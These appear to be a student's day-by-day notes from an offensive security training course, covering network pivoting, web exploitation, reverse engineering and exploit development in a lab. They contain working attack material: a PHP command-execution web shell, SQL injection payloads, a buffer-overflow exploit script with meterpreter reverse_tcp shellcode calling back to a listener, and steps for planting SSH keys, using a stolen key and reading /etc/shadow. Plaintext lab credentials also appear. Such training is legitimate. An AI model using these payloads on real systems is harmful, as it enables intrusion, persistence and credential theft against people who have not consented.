# Networking Module

## Day 1

### Links
  *  https://sec.cybbh.io/public/security/latest/index.html
  *  http://10.50.20.30:8000/challenges

### Ops Stations
 * Windows: ```10.50.24.165```
 * Linux: ```10.50.35.203```

### Stack Info
  *  Stack No. ```1```
  *  Username: ```NAAN-006-M```
  *  Password: ```0pnw1tLceqmGWTj```
  *  IP: ```10.50.36.164```

## "MAKE GOOD OPNOTES"

### New Tunneling Method

#### 1. Will setup connection to the jumpbox
 
 ```ssh -MS /tmp/jump student@10.50.36.164```


#### 2. Enumerate using Ruby Pingsweep
 
 ```for i in {1..254} ;do (ping -c 1 X.X.X.$i | grep "bytes from" &) ;done```


#### 3. Setup Proxychains from Lin-Ops
 
 ```ssh -S /tmp/jump jump -O forward -D 9050```

 * To Cancel Proxychain : replace forward before -D with ```cancel```

#### 4. Discover Open Ports on Hosts

 ```proxychains nmap -Pn X.X.X.X -T4 -n```


#### 5. Banner Grab Ports of Interest

 ```proxychains nc X.X.X.X (Port)```

#### 6. Local Port Forwards to Internal Web Servers and SSH Server

 ```ssh -S /tmp/jump jump -O forward -L2222:X.X.X.X:80 -L3333:X.X.X.X:2222```

#### 7. Connect on port 3333 to address specified in Forward

 * Connecting to SSH Server

 ```ssh -MS /tmp/t1 creds@127.0.0.1 -p 3333```

 * Connecting to Web Server

 ```ssh -MS /tmp/t1 creds@127.0.0.1 -p 2222```

#### SCP

Remote -> Local
```
```
Local -> Remote
```scp -P 1234 inventory.exe comrade@127.0.0.1:.
```
<hr>

## Slide Notes

### XPATH HTML Scraper
```
#!/usr/bin/python
import lxml.html
import requests

page = requests.get('http://quotes.toscrape.com')
tree = lxml.html.fromstring(page.content)

authors = tree.xpath('//small[@class="author"]/text()')

print ('Authors: ',authors)
```
#### Uses Python to scrape webpage at domain for certain HTML element

### Nmap Scripting Engine
```proxychains nmap -T4 --script=banner=http-enum 192.168.28.100 -p80```

## Day 2

### Webdev stuff I learned back in HS, javascript, lookin in html, the works.

### Enumerate website

/uploads
/chat
/cmdinjection
/java
/path
/webexample
/cross
/

From surfing:
 * index.html
      Has styles in head, fileUpload.php button at the top and db_recover.php button at the bottom of the page.
      folders on interest
      /icons
      /uploads -->  Provides a shell

      ssh-keygen
      echo "your key" >> currentuser directory/.ssh/authorized keys
      check with ls -la and cat
      ### Allows for logging in without password

      uploading malicious php files will allow for launching a web shell
   
```
  <HTML>
  <BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>
```

# Day 3

   ## MYSQL

   
   ### Default Databases

   
   information_schema
  
   mysql
  
   performance_schema

   ### Commands


   #### Syntax

   
   Terminate each line w a semicolon
   
   select * from (DB) - gets data from db
   
   union - combine 2 or more select statements
   
   use - select a db
   
   update - updates a db

   show table - shows a table

   #### Examples
   
   ```select username,passwd,studentID from session.userinfo ;```

   ```select name,cost,color from session.car ;```

   ```UNION SELECT type,2,cost,color,year from session.car #```
   
   ```UNION SELECT carid,2,type,name,year from session.car #```

   #### Golden Statement:
   
   ```select table_schema,table_name,column_name from information_schema.columns ;```
   
   ```UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #```

   ## SQL Injection
   
   ![image](https://github.com/user-attachments/assets/88a665f1-ed46-4782-beff-a91ba3ed9357)


   Paste into both fields to find vulnerable input box
   ```' or 1='1```

   ![image](https://github.com/user-attachments/assets/68bd1ec1-e920-4b5d-8804-5f407acf589c)

   Inspect element and navigate to the Network tab, then click on the POST packet 

   ![image](https://github.com/user-attachments/assets/e58a3ded-9837-4e32-bd1a-554cf89207d6)


   ![image](https://github.com/user-attachments/assets/0b3ebd4c-d314-411e-9445-58e06c4b1d13)


   In the POST packet, look to the right and click raw to view the string to make your query

   ![image](https://github.com/user-attachments/assets/28c8ec91-2666-4dd7-9911-e2e5e5e7ec4a)

   UNION SELECT type,2,cost,color,year from session.car #
   UNION SELECT carid,2,type,name,year from session.car #
 #Place ? at end of (url).php to make it a query then add string, should return wanted info array

<hr>

## Day 4

### Reverse Engineering Day

### x86 Assembly

   #### 16 general purpose 64bit registers
   
   ```%rax``` First return register

   ```%rbx``` Second return register

   ```%rcx``` Third return register

   ```%rdx``` Fourth return register

   ```%rbp``` Base Pointer that stores location of the bottom on the stack
   
   ```%rsp``` Register that stores location of top of the stack

   ### Memory Structure

|HEAP|STACK|General Register|Control Register|Flags Register|
|:---:|:---:|:---:|:---:|:---:|
|Memory to be allocated and deallocated|Contiguous section of memory for passing arguments|Multipurpose register that can be used to store data/memory locations|Processor register changing CPU behavior|Stores state of CPU|

 * #### Memory Offset
|64bit|32bit|Lower 16 bits|Desc|
|:---:|:---:|:---:|:---:|
|RIP|EIP|IP|Instruction Pointer, holds address for next instruction|

 * #### Instruction Pointers

|MOV|PUSH|POP|INC|DEC|ADD|SUB|CMP|JMP|JLE|JE|
|:---:|:---:|:---:|:---:|:---:|:---:|:---:|:---:|:---:|:---:|:---:|
|Move src to dst|Push src onto stack, stack grows by 8 bytes|Pop top of stack to dst, stack shrinks by 8|Increment src by 1|Decrement src by 1|Add src to dst|Subtract src from dst|Compare 2 vals by subtracting them and setting %RFLAGS, ZeroFlag set means they are the same|Jump to location|Jump if Less or Equal|Jump if Equal|

Examples:
```
  1 main:
  2     mov rax, 16         //Move into rax, value of 16
  3     push rax        //Push rax (16) to top of the stack, stack will grow by 8 bytes
  4     jmp mem2    //Jump to memory location with function mem2
  5 
  6 mem1:
  7     mov rax, 8          //Move into rax, value of 8
  8     ret             //Will return contents of first return register
  9 
 10 mem2:
 11     pop r8              //Pop value at top of the stack (16) into r8
 12     cmp rax, r8     //Compare rax (16) to r8 (16) by subtracting then set ZeroFlag bc they are the same
 13     je mem1      //Jump to mem1 if ZeroFlag is set (it is) to equal
```
```
  1 main:
  2     mov rcx, 25         //Move value 35 into rcx
  3     mov rbx, 62      //Move value 62 into rbx
  4     jmp mem1      //Jump to memory location containing function mem1
  5 
  6 mem1:
  7     sub rbx, 40             //Subtract value of 40 from rbx, making rbx = 22
  8     mov rsi, rbx        //Move value of rbx into rsi, making rsi = 22
  9     cmp rcx, rsi     //Compare rsi (22) to rcx (25) Less than flag is set
 10     jle mem2       //Jump to memory location containing function mem2 if rsi (22) <= rcx (25)
 11 
 12 mem2:
 13     mov rax, 0      //Move value 0 into rax
 14     ret          //Return contents of first register, rax (0)
```

### Reverse Engineering Workflow (Software)
 * Static
 * Behavioral
 * Dynamic
 * Disassembly
 * Document Findings

# Day 5

### Exploit Engineering

get program and confirm whether it uses vulnerable assembly instruction (gets)

script will be edited as time goes on, start with something simple

```
#!/usr/bin/env python
buffer = "A" * 200
print(buffer)
```

run program through gbd with a script as an argument using run <<<$(script.py)

find code and copy the location it says and use it for offset

find offset value, https://wiremask.eu/tools/buffer-overflow-pattern-generator/

next run gdb without any plugins and unset COLUMNS & LINES, then run the program to confirm it crashes

map memory with ```info proc map```

look for jmp esp with 1st 4 locations, 1st location for heap and last for stack```find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4```

Use msfconsole, msfvenom, to make shellcode
msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python

# Day 6

### Windows Exploitation Engineering

make script to connect to vuln server

```
#!/usr/bin/env python
import socket

buf = "TRUN /.:/"
buf += "A" * 2003
buf += "\xa0\x12\x50\x62"
buf += "\x90" * 10
## msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.35.203 lport=5555 -b "\x00" -f python
buf += b"\xbf\x43\x95\xe3\x4e\xda\xcf\xd9\x74\x24\xf4\x5e"
buf += b"\x2b\xc9\xb1\x59\x31\x7e\x14\x83\xee\xfc\x03\x7e"
buf += b"\x10\xa1\x60\x1f\xa6\xaa\x8b\xe0\x37\xd4\xba\x32"
buf += b"\xbe\xf1\xd9\x39\x93\xc9\xaa\x6c\x18\xa2\xff\x84"
buf += b"\xab\xc6\xd7\xab\x1c\x6c\x0e\x85\x9d\x41\x8e\x49"
buf += b"\x5d\xc0\x72\x90\xb2\x22\x4a\x5b\xc7\x23\x8b\x2d"
buf += b"\xad\xcc\x41\x25\x1f\x02\xed\x7b\x9c\x75\xf0\xab"
buf += b"\x57\x39\x8a\xce\xa8\xcd\x26\xd0\xf8\xa6\xef\xf2"
buf += b"\x73\xf0\x17\xf2\x50\x50\xad\x3d\x22\x6c\x9c\x42"
buf += b"\x82\x07\xea\x37\x14\xc1\x22\x88\xd6\x22\x49\xa4"
buf += b"\xd8\x7b\x6a\x54\xaf\x77\x88\xe9\xa8\x4c\xf2\x35"
buf += b"\x3c\x52\x54\xbd\xe6\xb6\x64\x12\x70\x3d\x6a\xdf"
buf += b"\xf6\x19\x6f\xde\xdb\x12\x8b\x6b\xda\xf4\x1d\x2f"
buf += b"\xf9\xd0\x46\xeb\x60\x41\x23\x5a\x9c\x91\x8b\x03"
buf += b"\x38\xda\x3e\x55\x3c\x23\xc1\x5a\x60\xb3\x0d\x97"
buf += b"\x9b\x43\x1a\xa0\xe8\x71\x85\x1a\x67\x39\x4e\x85"
buf += b"\x70\x48\x58\x36\xae\xf2\x09\xc8\x4f\x02\x03\x0f"
buf += b"\x1b\x52\x3b\xa6\x24\x39\xbb\x47\xf1\xd7\xb1\xdf"
buf += b"\xf0\x15\xe5\xd4\x6d\x5b\xe9\xff\xde\xd2\x0f\xaf"
buf += b"\x70\xb4\x9f\x10\x21\x74\x70\xf9\x2b\x7b\xaf\x19"
buf += b"\x54\x56\xd8\xb0\xbb\x0e\xb0\x2c\x25\x0b\x4a\xcc"
buf += b"\xaa\x86\x36\xce\x21\x22\xc6\x81\xc1\x47\xd4\xf6"
buf += b"\xb5\xa7\x24\x07\x50\xa7\x4e\x03\xf2\xf0\xe6\x09"
buf += b"\x23\x36\xa9\xf2\x06\x45\xae\x0d\xd7\x7f\xc4\x38"
buf += b"\x4d\x3f\xb2\x44\x81\xbf\x42\x13\xcb\xbf\x2a\xc3"
buf += b"\xaf\xec\x4f\x0c\x7a\x81\xc3\x99\x85\xf3\xb0\x0a"
buf += b"\xee\xf9\xef\x7d\xb1\x02\xda\xfd\xb6\xfc\x98\x29"
buf += b"\x1f\x94\x62\x6a\x9f\x64\x09\x6a\xcf\x0c\xc6\x45"
buf += b"\xe0\xfc\x27\x4c\xa9\x94\xa2\x01\x1b\x05\xb2\x0b"
buf += b"\xfd\x9b\xb3\xb8\x26\x2c\xc9\xb1\xd9\xcd\x2e\xd8"
buf += b"\xbd\xce\x2e\xe4\xc3\xf3\xf8\xdd\xb1\x32\x39\x5a"
buf += b"\xc9\x01\x1c\xcb\x40\x69\x32\x0b\x41"

## 625012a0 
## \xa0\x12\x50\x62

s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM) ## Create IPv4 TCP
s.connect(("127.0.0.1", 4321)) ## Private IP of winops secureserver
print s.recv(1024) ## Print what is received
s.send(buf) ## Send buf variable
print s.recv(1024) ## Once again print what is received
s.close() ## Close socket
```

use vulnerable commands ```trun /.:/```

use 5000 character string to crash program and find EIP in immunity db

use EIP to find offset and iterate a single character that many times

set buf to TRUN /.:/ and += yuor iteration line

create a nop slep with += "\x90" * 10 (if 10 doesn't work go somewhere between 11-20)

use the msfvenom script to generate the little endian shell code 

open msfconsole and run
```
use miltihandler
set payload windows/meterpreter/reverse_tcp
set lhost
set lport
run
```

run script in python

# Day 7

#### Similar to control sockets but usable for Windows machines without SSH
```
netsh interface portproxy add v4tov4 listenport=<LocalPort> listenaddress=<LocalIP> connectport=<TargetPort> connectaddress=<TargetIP> protocol=tcp
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport=<LocalPort>
netsh interface portproxy reset
```

#### SSH keys
```
chmod 600 /home/student/stolenkey
ssh -i /home/student/stolenkey jane@1.2.3.4
```

#### Enumeration Commands
 * Windows
```
net user
tasklist /v
tasklist /svc & get ciminstance
ipconfig /all
```

 * Linux
```
sudo -l
cat /etc/passwd & /etc/shadow
ps -elf
chkconfig (SysV) & systemctl --type=service (SystemD)
ifconfig -a (SysV) & ip a (SystemD)
netstat (SysV) & ss -ntlp (SystemD)
```
